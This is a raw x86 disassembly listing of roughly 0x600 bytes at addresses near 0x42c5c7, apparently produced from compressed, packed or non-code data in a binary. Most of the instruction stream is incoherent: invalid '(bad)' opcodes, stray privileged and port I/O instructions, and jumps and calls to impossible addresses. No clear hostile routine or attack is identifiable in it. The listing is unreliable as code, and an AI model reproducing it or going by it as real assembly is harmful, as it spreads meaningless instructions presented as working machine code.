  42c5c7:	f7 b3 bc 39 85 d2    	divl   -0x2d7ac644(%ebx)
  42c5cd:	75 05                	jne    0x42c5d4
  42c5cf:	5f                   	pop    %edi
  42c5d0:	eb 10                	jmp    0x42c5e2
  42c5d2:	64 08 e9             	fs or  %ch,%cl
  42c5d5:	59                   	pop    %ecx
  42c5d6:	b3 61                	mov    $0x61,%bl
  42c5d8:	b6 19                	mov    $0x19,%dh
  42c5da:	59                   	pop    %ecx
  42c5db:	b3 5e                	mov    $0x5e,%bl
  42c5dd:	b4 88                	mov    $0x88,%ah
  42c5df:	04 08                	add    $0x8,%al
  42c5e1:	db 0b                	fisttpl (%ebx)
  42c5e3:	7b ed                	jnp    0x42c5d2
  42c5e5:	10 50 30             	adc    %dl,0x30(%eax)
  42c5e8:	55                   	push   %ebp
  42c5e9:	f1                   	int1
  42c5ea:	75 04                	jne    0x42c5f0
  42c5ec:	29 eb                	sub    %ebp,%ebx
  42c5ee:	7d 78                	jge    0x42c668
  42c5f0:	bf fb 68 68 2c       	mov    $0x2c6868fb,%edi
  42c5f5:	57                   	push   %edi
  42c5f6:	42                   	inc    %edx
  42c5f7:	cb                   	lret
  42c5f8:	0c 52                	or     $0x52,%al
  42c5fa:	e8 72 35 00 1d       	call   0x1d42fb71
  42c5ff:	39 6a 01             	cmp    %ebp,0x1(%edx)
  42c602:	b2 bd                	mov    $0xbd,%dl
  42c604:	ae                   	scas   %es:(%edi),%al
  42c605:	fd                   	std
  42c606:	30 e8                	xor    %ch,%al
  42c608:	6e                   	outsb  %ds:(%esi),(%dx)
  42c609:	fe 4d 85             	decb   -0x7b(%ebp)
  42c60c:	50                   	push   %eax
  42c60d:	1e                   	push   %ds
  42c60e:	3d 98 85 dd ec       	cmp    $0xecdd8598,%eax
  42c613:	2f                   	das
  42c614:	6c                   	insb   (%dx),%es:(%edi)
  42c615:	50                   	push   %eax
  42c616:	e8 54 19 d4 c6       	call   0xc716df6f
  42c61b:	04 29                	add    $0x29,%al
  42c61d:	69 98 84 09 7c 6c 0c 	imul   $0x1234140c,0x6c7c0984(%eax),%ebx
  42c624:	14 34 12 
  42c627:	22 7c 9b e3          	and    -0x1d(%ebx,%ebx,4),%bh
  42c62b:	7f 62                	jg     0x42c68f
  42c62d:	05 4b 47 87 36       	add    $0x3687474b,%eax
  42c632:	a1 61 28 dd d4       	mov    0xd4dd2861,%eax
  42c637:	84 88 33 b7 6d 77    	test   %cl,0x776db733(%eax)
  42c63d:	f7 8d 04 cd 05 20 99 	testl  $0x506b999,0x2005cd04(%ebp)
  42c644:	b9 06 05 
  42c647:	f7 f9                	idiv   %ecx
  42c649:	14 dc                	adc    $0xdc,%al
  42c64b:	4f                   	dec    %edi
  42c64c:	dc 81 5d 6e 7f c7    	faddl  -0x388091a3(%ecx)
  42c652:	e2 03                	loop   0x42c657
  42c654:	57                   	push   %edi
  42c655:	79 05                	jns    0x42c65c
  42c657:	4a                   	dec    %edx
  42c658:	83 ca fc             	or     $0xfffffffc,%edx
  42c65b:	42                   	inc    %edx
  42c65c:	e8 74 1b dc 25       	call   0x261ee1d5
  42c661:	7b 61                	jnp    0x42c6c4
  42c663:	f7 9f 12 48 83 c8    	negl   -0x377cb7ee(%edi)
  42c669:	fc                   	cld
  42c66a:	40                   	inc    %eax
  42c66b:	b9 04 2c 2b c8       	mov    $0xc82b2c04,%ecx
  42c670:	4f                   	dec    %edi
  42c671:	d8 eb                	fsubr  %st(3),%st
  42c673:	07                   	pop    %es
  42c674:	50                   	push   %eax
  42c675:	ad                   	lods   %ds:(%esi),%eax
  42c676:	2c 74                	sub    $0x74,%al
  42c678:	6e                   	outsb  %ds:(%esi),(%dx)
  42c679:	d8 0c 85 d8 25 e8 02 	fmuls  0x2e825d8(,%eax,4)
  42c680:	72 c8                	jb     0x42c64a
  42c682:	d6                   	salc
  42c683:	fe 4d dc             	decb   -0x24(%ebp)
  42c686:	8d 54 01 01          	lea    0x1(%ecx,%eax,1),%edx
  42c68a:	52                   	push   %edx
  42c68b:	c5 f2 cc             	(bad)
  42c68e:	f4                   	hlt
  42c68f:	cf                   	iret
  42c690:	e6 2e                	out    %al,$0x2e
  42c692:	cb                   	lret
  42c693:	f4                   	hlt
  42c694:	07                   	pop    %es
  42c695:	e9 f3 2b 32 e4       	jmp    0xe474f28d
  42c69a:	eb 6f                	jmp    0x42c70b
  42c69c:	b7 91                	mov    $0x91,%bh
  42c69e:	85 09                	test   %ecx,(%ecx)
  42c6a0:	3a e4                	cmp    %ah,%ah
  42c6a2:	e4 34                	in     $0x34,%al
  42c6a4:	e4 3b                	in     $0x3b,%al
  42c6a6:	37                   	aaa
  42c6a7:	0f 8d a8 b6 fc 7f    	jge    0x803f7d55
  42c6ad:	7b 49                	jnp    0x42c6f8
  42c6af:	1d 6b c0 06 99       	sbb    $0x9906c06b,%eax
  42c6b4:	83 e2 07             	and    $0x7,%edx
  42c6b7:	03 c2                	add    %edx,%eax
  42c6b9:	c1 f8 03             	sar    $0x3,%eax
  42c6bc:	e0 5b                	loopne 0x42c719
  42c6be:	b5 87                	mov    $0x87,%ch
  42c6c0:	6c                   	insb   (%dx),%es:(%edi)
  42c6c1:	b7 11                	mov    $0x11,%bh
  42c6c3:	d2 06                	rolb   %cl,(%esi)
  42c6c5:	94                   	xchg   %eax,%esp
  42c6c6:	07                   	pop    %es
  42c6c7:	f8                   	clc
  42c6c8:	42                   	inc    %edx
  42c6c9:	6b 17 de             	imul   $0xffffffde,(%edi),%edx
  42c6cc:	6e                   	outsb  %ds:(%esi),(%dx)
  42c6cd:	bf cc 7d ec 03       	mov    $0x3ec7dcc,%edi
  42c6d2:	7d 1e                	jge    0x42c6f2
  42c6d4:	2d f0 03 21 33       	sub    $0x332103f0,%eax
  42c6d9:	c9                   	leave
  42c6da:	8a 3a                	mov    (%edx),%bh
  42c6dc:	d1 b9 5b 68 db bf    	sarl   $1,-0x402497a5(%ecx)
  42c6e2:	02 96 4d ec d3 fa    	add    -0x52c13b3(%esi),%dl
  42c6e8:	3c 3f                	cmp    $0x3f,%al
  42c6ea:	21 aa 47 1d 9b 7d    	and    %ebp,0x7d9b1d47(%edx)
  42c6f0:	6b 03 63             	imul   $0x63,(%ebx),%eax
  42c6f3:	32 e9                	xor    %cl,%ch
  42c6f5:	02 d3                	add    %bl,%dl
  42c6f7:	e2 1b                	loop   0x42c714
  42c6f9:	7a d9                	jp     0x42c6d4
  42c6fb:	da 85 66 e0 3b 2e    	fiaddl 0x2e3be066(%ebp)
  42c701:	7d 22                	jge    0x42c725
  42c703:	18 24 4d 2d f6 ad 7d 	sbb    %ah,0x7dadf62d(,%ecx,2)
  42c70a:	d2 8a 51 01 15 23    	rorb   %cl,0x23150151(%edx)
  42c710:	e8 02 b9 08 de       	call   0xde4b8017
  42c715:	46                   	inc    %esi
  42c716:	ad                   	lods   %ds:(%esi),%eax
  42c717:	bd b5 1d 94 0b       	mov    $0xb941db5,%ebp
  42c71c:	ca e5 2c             	lret   $0x2ce5
  42c71f:	55                   	push   %ebp
  42c720:	f4                   	hlt
  42c721:	03 83 4c e6 0c df    	add    -0x20f319b4(%ebx),%eax
  42c727:	96                   	xchg   %eax,%esi
  42c728:	f8                   	clc
  42c729:	fc                   	cld
  42c72a:	4a                   	dec    %edx
  42c72b:	88 0a                	mov    %cl,(%edx)
  42c72d:	e9 43 e9 be 13       	jmp    0x1401b075
  42c732:	76 bb                	jbe    0x42c6ef
  42c734:	7c 8f                	jl     0x42c6c5
  42c736:	1c 19                	sbb    $0x19,%al
  42c738:	dc e8                	fsubr  %st,%st(0)
  42c73a:	39 b8 7d 0b 4c d0    	cmp    %edi,-0x2fb3f483(%eax)
  42c740:	3d fb cb f4 e4       	cmp    $0xe4f4cbfb,%eax
  42c745:	c6 01 3d             	movb   $0x3d,(%ecx)
  42c748:	eb e1                	jmp    0x42c72b
  42c74a:	35 c6 02 d1 f4       	xor    $0xf4d102c6,%eax
  42c74f:	d8 b5 e9 83 80 6a    	fdivs  0x6a8083e9(%ebp)
  42c755:	ff 68 a0             	ljmp   *-0x60(%eax)
  42c758:	ae                   	scas   %es:(%edi),%al
  42c759:	68 b0 57 64 a1       	push   $0xa16457b0
  42c75e:	5b                   	pop    %ebx
  42c75f:	5d                   	pop    %ebp
  42c760:	78 7f                	js     0x42c7e1
  42c762:	04 50                	add    $0x50,%al
  42c764:	64 89 25 07 26 f0 53 	mov    %esp,%fs:0x53f02607
  42c76b:	44                   	inc    %esp
  42c76c:	89 fe                	mov    %edi,%esi
  42c76e:	3f                   	aas
  42c76f:	02 ed                	add    %ch,%ch
  42c771:	65 e8 c7 62 f5 b8    	gs call 0xb9382a3e
  42c777:	68 58 4d 56 bb       	push   $0xbb564d58
  42c77c:	65 d4 85             	gs aam $0x85
  42c77f:	86 b9 0a 84 af f9    	xchg   %bh,-0x6507bf6(%ecx)
  42c785:	ef                   	out    %eax,(%dx)
  42c786:	1f                   	pop    %ds
  42c787:	66 ba 58 56          	mov    $0x5658,%dx
  42c78b:	ed                   	in     (%dx),%eax
  42c78c:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  42c78f:	5b                   	pop    %ebx
  42c790:	ff                   	(bad)
  42c791:	7d 19                	jge    0x42c7ac
  42c793:	d8 dc                	fcomp  %st(4)
  42c795:	06                   	push   %es
  42c796:	fb                   	sti
  42c797:	76 c3                	jbe    0x42c75c
  42c799:	8b 31                	mov    (%ecx),%esi
  42c79b:	c6 45 e3 00          	movb   $0x0,-0x1d(%ebp)
  42c79f:	15 8a 0a eb 0c       	adc    $0xceb0a8a,%eax
  42c7a4:	67 73 7f             	addr16 jae 0x42c826
  42c7a7:	2f                   	das
  42c7a8:	65 81 7d e4 3d 0f 94 	cmpl   $0xc0940f3d,%gs:-0x1c(%ebp)
  42c7af:	c0 
  42c7b0:	db 60 0d             	(bad) 0xd(%eax)
  42c7b3:	11 72 d9             	adc    %esi,-0x27(%edx)
  42c7b6:	52                   	push   %edx
  42c7b7:	66 5b                	pop    %bx
  42c7b9:	84 b0 60 1f 4b c8    	test   %dh,-0x37b4e0a0(%eax)
  42c7bf:	f4                   	hlt
  42c7c0:	62 0f                	bound  %ecx,(%edi)
  42c7c2:	3f                   	aas
  42c7c3:	07                   	pop    %es
  42c7c4:	0b 5e a5             	or     -0x5b(%esi),%ebx
  42c7c7:	4b                   	dec    %ebx
  42c7c8:	0e                   	push   %cs
  42c7c9:	b0 7b                	mov    $0x7b,%al
  42c7cb:	e7 e7                	out    %eax,$0xe7
  42c7cd:	b2 d9                	mov    $0xd9,%dl
  42c7cf:	f8                   	clc
  42c7d0:	58                   	pop    %eax
  42c7d1:	d9 b0 01 71 77 2c    	fnstenv 0x2c777101(%eax)
  42c7d7:	00 0c cd 86 39 69 0d 	add    %cl,0xd693986(,%ecx,8)
  42c7de:	fb                   	sti
  42c7df:	34 7d                	xor    $0x7d,%al
  42c7e1:	0c 6b                	or     $0x6b,%al
  42c7e3:	3e 64 eb d2          	ds fs jmp 0x42c7b9
  42c7e7:	c9                   	leave
  42c7e8:	03 97 0a 51 3b d4    	add    -0x2bc4aef6(%edi),%edx
  42c7ee:	fc                   	cld
  42c7ef:	68 30 d9 30 1f       	push   $0x1f30d930
  42c7f4:	91                   	xchg   %eax,%ecx
  42c7f5:	12 d3                	adc    %bl,%dl
  42c7f7:	3c 2b                	cmp    $0x2b,%al
  42c7f9:	f8                   	clc
  42c7fa:	42                   	inc    %edx
  42c7fb:	59                   	pop    %ecx
  42c7fc:	46                   	inc    %esi
  42c7fd:	0e                   	push   %cs
  42c7fe:	f8                   	clc
  42c7ff:	f8                   	clc
  42c800:	f8                   	clc
  42c801:	b6 82                	mov    $0x82,%dh
  42c803:	0b 72 f7             	or     -0x9(%edx),%esi
  42c806:	3c 68                	cmp    $0x68,%al
  42c808:	34 28                	xor    $0x28,%al
  42c80a:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  42c80d:	5a                   	pop    %edx
  42c80e:	ea b2 66 b7 ce f8 66 	ljmp   $0x66f8,$0xceb766b2
  42c815:	18 78 19             	sbb    %bh,0x19(%eax)
  42c818:	f5                   	cmc
  42c819:	6c                   	insb   (%dx),%es:(%edi)
  42c81a:	6d                   	insl   (%dx),%es:(%edi)
  42c81b:	ce                   	into
  42c81c:	fa                   	cli
  42c81d:	45                   	inc    %ebp
  42c81e:	d4 50                	aam    $0x50
  42c820:	61                   	popa
  42c821:	38 eb                	cmp    %ch,%bl
  42c823:	b3 93                	mov    $0x93,%bl
  42c825:	fc                   	cld
  42c826:	23 2d 90 93 20 78    	and    0x78209390,%ebp
  42c82c:	a1 3f ec a4 b7       	mov    0xb7a4ec3f,%eax
  42c831:	6c                   	insb   (%dx),%es:(%edi)
  42c832:	09 10                	or     %edx,(%eax)
  42c834:	13 3b                	adc    (%ebx),%edi
  42c836:	87 dc                	xchg   %ebx,%esp
  42c838:	23 e4                	and    %esp,%esp
  42c83a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42c83b:	87 f4                	xchg   %esi,%esp
  42c83d:	eb 17                	jmp    0x42c856
  42c83f:	a9 10 51 a0 d8       	test   $0xd8a05110,%eax
  42c844:	1b b0 12 d6 fa c0    	sbb    -0x3f0529ee(%eax),%esi
  42c84a:	0c fa                	or     $0xfa,%al
  42c84c:	9a 74 b3 03 fc d5 dc 	lcall  $0xdcd5,$0xfc03b374
  42c853:	f4                   	hlt
  42c854:	76 eb                	jbe    0x42c841
  42c856:	18 d9                	sbb    %bl,%cl
  42c858:	9f                   	lahf
  42c859:	f4                   	hlt
  42c85a:	f4                   	hlt
  42c85b:	33 3b                	xor    (%ebx),%edi
  42c85d:	fb                   	sti
  42c85e:	7d 13                	jge    0x42c873
  42c860:	cd d8                	int    $0xd8
  42c862:	b5 cb                	mov    $0xcb,%ch
  42c864:	35 f4 8e 80 03       	xor    $0x3808ef4,%eax
  42c869:	d1 7f eb             	sarl   $1,-0x15(%edi)
  42c86c:	dc ac c9 16 10 47 37 	fsubrl 0x37471016(%ecx,%ecx,8)
  42c873:	fc                   	cld
  42c874:	95                   	xchg   %eax,%ebp
  42c875:	db e5                	frstpm(287 only)
  42c877:	9b                   	fwait
  42c878:	95                   	xchg   %eax,%ebp
  42c879:	62 5d 39             	bound  %ebx,0x39(%ebp)
  42c87c:	7d 16                	jge    0x42c894
  42c87e:	46                   	inc    %esi
  42c87f:	08 5b 3b             	or     %bl,0x3b(%ebx)
  42c882:	74 95                	je     0x42c819
  42c884:	03 e9                	add    %ecx,%ebp
  42c886:	33 66 0b             	xor    0xb(%esi),%esp
  42c889:	be 88 3b 1c 64       	mov    $0x641c3b88,%esi
  42c88e:	ee                   	out    %al,(%dx)
  42c88f:	01 eb                	add    %ebp,%ebx
  42c891:	d2 54 41 fc          	rclb   %cl,-0x4(%ecx,%eax,2)
  42c895:	56                   	push   %esi
  42c896:	3a b6 64 92 03 10    	cmp    0x10039264(%esi),%dh
  42c89c:	d9 ca                	fxch   %st(2)
  42c89e:	f0 0d cc cc 08 30    	lock or $0x3008cccc,%eax
  42c8a4:	06                   	push   %es
  42c8a5:	83 fa 20             	cmp    $0x20,%edx
  42c8a8:	74 21                	je     0x42c8cb
  42c8aa:	d8 7f ee             	fdivrs -0x12(%edi)
  42c8ad:	27                   	daa
  42c8ae:	39 83 f9 09 74 3e    	cmp    %eax,0x3e7409f9(%ebx)
  42c8b4:	3b 83 f8 0d 74 0b    	cmp    0xb740df8(%ebx),%eax
  42c8ba:	20 3c 76             	and    %bh,(%esi,%esi,2)
  42c8bd:	09 7c 0a 75          	or     %edi,0x75(%edx,%ecx,1)
  42c8c1:	0b 3d c9 67 08 74    	or     0x740867c9,%edi
  42c8c7:	2c 78                	sub    $0x78,%al
  42c8c9:	e9 70 c0 56 cf       	jmp    0xcf99893e
  42c8ce:	53                   	push   %ebx
  42c8cf:	11 88 10 03 c9 5e    	adc    %ecx,0x5ec90310(%eax)
  42c8d5:	40                   	inc    %eax
  42c8d6:	df 36                	fbstp  (%esi)
  42c8d8:	31 67 04             	xor    %esp,0x4(%edi)
  42c8db:	0e                   	push   %cs
  42c8dc:	0b 58 da             	or     -0x26(%eax),%ebx
  42c8df:	b8 7b 08 82 c9       	mov    $0xc982087b,%eax
  42c8e4:	3d 04 5c 64 7d       	cmp    $0x7d645c04,%eax
  42c8e9:	eb eb                	jmp    0x42c8d6
  42c8eb:	14 e0                	adc    $0xe0,%al
  42c8ed:	ef                   	out    %eax,(%dx)
  42c8ee:	c5 5c 43 44          	lds    0x44(%ebx,%eax,2),%ebx
  42c8f2:	08 5a 83             	or     %bl,-0x7d(%edx)
  42c8f5:	99                   	cltd
  42c8f6:	28 ec                	sub    %ch,%ah
  42c8f8:	c5 da 73             	(bad)
  42c8fb:	83 99 23 a4 99 20 64 	sbbl   $0x64,0x2099a423(%ecx)
  42c902:	a3 64 1e 0a 75       	mov    %eax,0x750a1e64
  42c907:	08 ac 11 c3 03 93 23 	or     %ch,0x239303c3(%ecx,%edx,1)
  42c90e:	b0 62                	mov    $0x62,%al
  42c910:	13 ff                	adc    %edi,%edi
  42c912:	88 7a 8d             	mov    %bh,-0x73(%edx)
  42c915:	b9 d9 85 0b 17       	mov    $0x170b85d9,%ecx
  42c91a:	1f                   	pop    %ds
  42c91b:	e8 65 10 81 cb       	call   0xcbc3d985
  42c920:	4f                   	dec    %edi
  42c921:	48                   	dec    %eax
  42c922:	02 68 14             	add    0x14(%eax),%ch
  42c925:	76 e8                	jbe    0x42c90f
  42c927:	69 8f cf 95 7d f3 de 	imul   $0xc8a340de,-0xc826a31(%edi),%ecx
  42c92e:	40 a3 c8 
  42c931:	99                   	cltd
  42c932:	41                   	inc    %ecx
  42c933:	00 29                	add    %ch,(%ecx)
  42c935:	24 3f                	and    $0x3f,%al
  42c937:	e7 00                	out    %eax,$0x0
  42c939:	79 21                	jns    0x42c95c
  42c93b:	a8 98                	test   $0x98,%al
  42c93d:	34 f9                	xor    $0xf9,%al
  42c93f:	74 6f                	je     0x42c9b0
  42c941:	90                   	nop
  42c942:	15 a1 23 2f 44       	adc    $0x442f23a1,%eax
  42c947:	cc                   	int3
  42c948:	9a 5b c8 e7 00 44 e5 	lcall  $0xe544,$0xe7c85b
  42c94f:	fd                   	std
  42c950:	2a f2                	sub    %dl,%dh
  42c952:	4d                   	dec    %ebp
  42c953:	20 9b 5f b4 5c 2f    	and    %bl,0x2f5cb45f(%ebx)
  42c959:	b5 9e                	mov    $0x9e,%ch
  42c95b:	03 ec                	add    %esp,%ebp
  42c95d:	01 d8                	add    %ebx,%eax
  42c95f:	9c                   	pushf
  42c960:	5f                   	pop    %edi
  42c961:	64 85 73 80          	test   %esi,%fs:-0x80(%ebx)
  42c965:	3c 40                	cmp    $0x40,%al
  42c967:	bc 99 70 4d 20       	mov    $0x204d7099,%esp
  42c96c:	07                   	pop    %es
  42c96d:	c8 55 d4 84          	enter  $0xd455,$0x84
  42c971:	e4 4b                	in     $0x4b,%al
  42c973:	1e                   	push   %ds
  42c974:	f2 2f                	repnz das
  42c976:	25 c8 99 14 53       	and    $0x531499c8,%eax
  42c97b:	42                   	inc    %edx
  42c97c:	0d 20 9f 01 94       	or     $0x94019f20,%eax
  42c981:	f5                   	cmc
  42c982:	fc                   	cld
  42c983:	b8 07 c8 37 81       	mov    $0x8137c807,%eax
  42c988:	ef                   	out    %eax,(%dx)
  42c989:	a0 2f c5 10 7a       	mov    0x7a10c52f,%al
  42c98e:	f2 4d                	repnz dec %ebp
  42c990:	60                   	pusha
  42c991:	5f                   	pop    %edi
  42c992:	ac                   	lods   %ds:(%esi),%al
  42c993:	2f                   	das
  42c994:	95                   	xchg   %eax,%ebp
  42c995:	a3 20 ec 20 4f       	mov    %eax,0x4f20ec20
  42c99a:	e7 64                	out    %eax,$0x64
  42c99c:	13 d0                	adc    %eax,%edx
  42c99e:	81 24 57 36 c6 41 be 	andl   $0xbe41c636,(%edi,%edx,2)
  42c9a5:	03 f8                	add    %eax,%edi
  42c9a7:	22 5e a4             	and    -0x5c(%esi),%bl
  42c9aa:	98                   	cwtl
  42c9ab:	03 0e                	add    (%esi),%ecx
  42c9ad:	d2 2d 57 03 77 22    	shrb   %cl,0x22770357
  42c9b3:	3b c0                	cmp    %eax,%eax
  42c9b5:	99                   	cltd
  42c9b6:	19 e4                	sbb    %esp,%esp
  42c9b8:	f9                   	stc
  42c9b9:	4a                   	dec    %edx
  42c9ba:	04 68                	add    $0x68,%al
  42c9bc:	30 18                	xor    %bl,(%eax)
  42c9be:	c4 79 f6             	les    -0xa(%ecx),%edi
  42c9c1:	79 00                	jns    0x42c9c3
  42c9c3:	16                   	push   %ss
  42c9c4:	68 3c f5 fb 8b       	push   $0x8bfbf53c
  42c9c9:	1c 56                	sbb    $0x56,%al
  42c9cb:	db 6e 5b             	fldt   0x5b(%esi)
  42c9ce:	07                   	pop    %es
  42c9cf:	51                   	push   %ecx
  42c9d0:	51                   	push   %ecx
  42c9d1:	e4 f8                	in     $0xf8,%al
  42c9d3:	d8 75 0c             	fdivs  0xc(%ebp)
  42c9d6:	02 08                	add    (%eax),%cl
  42c9d8:	de 5a 8a             	ficomps -0x76(%edx)
  42c9db:	b7 43                	mov    $0x43,%bh
  42c9dd:	09 08                	or     %ecx,(%eax)
  42c9df:	14 e8                	adc    $0xe8,%al
  42c9e1:	31 98 59 15 5a ba    	xor    %ebx,-0x45a5eaa7(%eax)
  42c9e7:	66 30 0b             	data16 xor %cl,(%ebx)
  42c9ea:	02 14 18             	add    (%eax,%ebx,1),%dl
  42c9ed:	b9 8c 1d ca b2       	mov    $0xb2ca1d8c,%ecx
  42c9f2:	22 10                	and    (%eax),%dl
  42c9f4:	f8                   	clc
  42c9f5:	5c                   	pop    %esp
  42c9f6:	08 10                	or     %dl,(%eax)
  42c9f8:	06                   	push   %es
  42c9f9:	ce                   	into
  42c9fa:	62 cb a9             	(bad) {%k1}{z}
  42c9fd:	c9                   	leave
  42c9fe:	b3 0c                	mov    $0xc,%bl
  42ca00:	d9 d7                	(bad)
  42ca02:	71 03                	jno    0x42ca07
  42ca04:	5d                   	pop    %ebp
  42ca05:	1c 24                	sbb    $0x24,%al
  42ca07:	14 c7                	adc    $0xc7,%al
  42ca09:	85 f8                	test   %edi,%eax
  42ca0b:	84 2c 09             	test   %ch,(%ecx,%ecx,1)
  42ca0e:	b9 5b d3 7d 6a       	mov    $0x6a7dd35b,%ecx
  42ca13:	06                   	push   %es
  42ca14:	68 38 78 74 80       	push   $0x80747838
  42ca19:	59                   	pop    %ecx
  42ca1a:	4e                   	dec    %esi
  42ca1b:	85 f4                	test   %esi,%esp
  42ca1d:	17                   	pop    %ss
  42ca1e:	bb 6f 7b 6f fb       	mov    $0xfb6f7b6f,%ebx
  42ca23:	68 da a2 64 58       	push   $0x5864a2da
  42ca28:	b5 0f                	mov    $0xf,%ch
  42ca2a:	68 38 80 e8 7b       	push   $0x7be88038
  42ca2f:	cd 6e                	int    $0x6e
  42ca31:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42ca32:	73 2b                	jae    0x42ca5f
  42ca34:	14 1c                	adc    $0x1c,%al
  42ca36:	db a1 b5 41 1f 45    	(bad) 0x451f41b5(%ecx)
  42ca3c:	6c                   	insb   (%dx),%es:(%edi)
  42ca3d:	90                   	nop
  42ca3e:	03 53 02             	add    0x2(%ebx),%edx
  42ca41:	3c 28                	cmp    $0x28,%al
  42ca43:	f2 6d                	repnz insl (%dx),%es:(%edi)
  42ca45:	af                   	scas   %es:(%edi),%eax
  42ca46:	ff 5c 0b 74          	lcall  *0x74(%ebx,%ecx,1)
  42ca4a:	5c                   	pop    %esp
  42ca4b:	23 4c d9 e4          	and    -0x1c(%ecx,%ebx,8),%ecx
  42ca4f:	db b5 02 27 2b 64    	(bad) 0x642b2702(%ebp)
  42ca55:	02 c8                	add    %al,%cl
  42ca57:	b1 15                	mov    $0x15,%cl
  42ca59:	f2 0e                	repnz push %cs
  42ca5b:	1f                   	pop    %ds
  42ca5c:	ee                   	out    %al,(%dx)
  42ca5d:	fe 86 a3 56 e8 83    	incb   -0x7c17a95d(%esi)
  42ca63:	3d 0b 57 5b 01       	cmp    $0x15b570b,%eax
  42ca68:	9e                   	sahf
  42ca69:	41                   	inc    %ecx
  42ca6a:	f7 83 0f 85 fc 16 50 	testl  $0x24eb2c50,0x16fc850f(%ebx)
  42ca71:	2c eb 24 
  42ca74:	39 b0 17 f6 57 13    	cmp    %esi,0x1357f617(%eax)
  42ca7a:	68 a8 25 38 23       	push   $0x233825a8
  42ca7f:	6c                   	insb   (%dx),%es:(%edi)
  42ca80:	c1 9a 60 0e fd 57 04 	rcrl   $0x4,0x57fd0e60(%edx)
  42ca87:	b4 30                	mov    $0x30,%ah
  42ca89:	f9                   	stc
  42ca8a:	4e                   	dec    %esi
  42ca8b:	7e a7                	jle    0x42ca34
  42ca8d:	7b fa                	jnp    0x42ca89
  42ca8f:	00 6a 83             	add    %ch,-0x7d(%edx)
  42ca92:	e6 76                	out    %al,$0x76
  42ca94:	37                   	aaa
  42ca95:	93                   	xchg   %eax,%ebx
  42ca96:	3e 04 68             	ds add $0x68,%al
  42ca99:	e0 9c                	loopne 0x42ca37
  42ca9b:	da ca                	fcmove %st(2),%st
  42ca9d:	b2 9a                	mov    $0x9a,%dl
  42ca9f:	58                   	pop    %eax
  42caa0:	3a 75 26             	cmp    0x26(%ebp),%dh
  42caa3:	7b cb                	jnp    0x42ca70
  42caa5:	b1 0f                	mov    $0xf,%cl
  42caa7:	38 de                	cmp    %bl,%dh
  42caa9:	4d                   	dec    %ebp
  42caaa:	be 86 93 87 50       	mov    $0x50879386,%esi
  42caaf:	f1                   	int1
  42cab0:	d4 54                	aam    $0x54
  42cab2:	26 7c f6             	es jl  0x42caab
  42cab5:	da a9 20 b2 40 89    	fisubrl -0x76bf4de0(%ecx)
  42cabb:	20 e8                	and    %ch,%al
  42cabd:	75 2b                	jne    0x42caea
  42cabf:	0b 36                	or     (%esi),%esi
  42cac1:	2b 34 c1             	sub    (%ecx,%eax,8),%esi
  42cac4:	59                   	pop    %ecx
  42cac5:	b6 01                	mov    $0x1,%dh
  42cac7:	90                   	nop
  42cac8:	0a cd                	or     %ch,%cl
  42caca:	9d                   	popf
  42cacb:	2d 36 20 53 48       	sub    $0x48532036,%eax
  42cad0:	5e                   	pop    %esi
  42cad1:	45                   	inc    %ebp
  42cad2:	ba db bf cd 92       	mov    $0x92cdbfdb,%edx
  42cad7:	f9                   	stc
  42cad8:	8b 8d 22 8d 44 08    	mov    0x8448d22(%ebp),%ecx
  42cade:	04 3c                	add    $0x3c,%al
  42cae0:	ec                   	in     (%dx),%al
  42cae1:	f3 10 50 16          	repz adc %dl,0x16(%eax)
  42cae5:	3b 59 c0             	cmp    -0x40(%ecx),%ebx
  42cae8:	8b a8 00 02 83 ec    	mov    -0x137cfe00(%eax),%ebp
  42caee:	f9                   	stc
  42caef:	6e                   	outsb  %ds:(%esi),(%dx)
  42caf0:	36 73 e8             	ss jae 0x42cadb
  42caf3:	e4 3c                	in     $0x3c,%al
  42caf5:	68 df 9d 2a 4c       	push   $0x4c2a9ddf
  42cafa:	08 d8                	or     %bl,%al
  42cafc:	63 98 1d 4e 3a e6    	arpl   %ebx,-0x19c5b1e3(%eax)
  42cb02:	0e                   	push   %cs
  42cb03:	b9 5b 4c 97 dd       	mov    $0xdd974c5b,%ecx
  42cb08:	1c 55                	sbb    $0x55,%al
  42cb0a:	42                   	inc    %edx
  42cb0b:	e4 ac                	in     $0xac,%al
  42cb0d:	0f df ee             	pandn  %mm6,%mm5
  42cb10:	d9 0b                	(bad) (%ebx)
  42cb12:	dd 1f                	fstpl  (%edi)
  42cb14:	20 56 d4             	and    %dl,-0x2c(%esi)
  42cb17:	9e                   	sahf
  42cb18:	2a ba 68 26 7b 21    	sub    0x217b2668(%edx),%bh
  42cb1e:	bf f0 20 20 56       	mov    $0x562020f0,%edi
  42cb23:	10 52 40             	adc    %dl,0x40(%edx)
  42cb26:	fc                   	cld
  42cb27:	f6 e7                	mul    %bh
  42cb29:	9b                   	fwait
  42cb2a:	fc                   	cld
  42cb2b:	1f                   	pop    %ds
  42cb2c:	10 52 67             	adc    %dl,0x67(%edx)
  42cb2f:	5d                   	pop    %ebp
  42cb30:	b8 04 51 00 42       	mov    $0x42005104,%eax
  42cb35:	b5 28                	mov    $0x28,%ch
  42cb37:	bc cd 8b 83 a5       	mov    $0xa5838bcd,%esp
  42cb3c:	d0 b3 3d 27 7f c7    	shlb   $1,-0x3880d8c3(%ebx)
  42cb42:	8e fc                	mov    %esp,%?
  42cb44:	40                   	inc    %eax
  42cb45:	89 06                	mov    %eax,(%esi)
  42cb47:	83 bd 15 02 73 7f ff 	cmpl   $0xffffffff,0x7f730215(%ebp)
  42cb4e:	f6 99 84 d3 34 85    	negb   -0x7acb2c7c(%ecx)
  42cb54:	aa                   	stos   %al,%es:(%edi)
  42cb55:	14 3c                	adc    $0x3c,%al
  42cb57:	04 79                	add    $0x79,%al
  42cb59:	11 10                	adc    %edx,(%eax)
  42cb5b:	cc                   	int3
  42cb5c:	c3                   	ret
  42cb5d:	5b                   	pop    %ebx
  42cb5e:	5b                   	pop    %ebx
  42cb5f:	3e ae                	ds scas %es:(%edi),%al
  42cb61:	5b                   	pop    %ebx
  42cb62:	f3 bd 37 f6 ad 07    	repz mov $0x7adf637,%ebp
  42cb68:	a0 08 26 19 26       	mov    0x26192608,%al
  42cb6d:	ec                   	in     (%dx),%al
  42cb6e:	2c 61                	sub    $0x61,%al
  42cb70:	5d                   	pop    %ebp
  42cb71:	35 13 21 21 58       	xor    $0x58212113,%eax
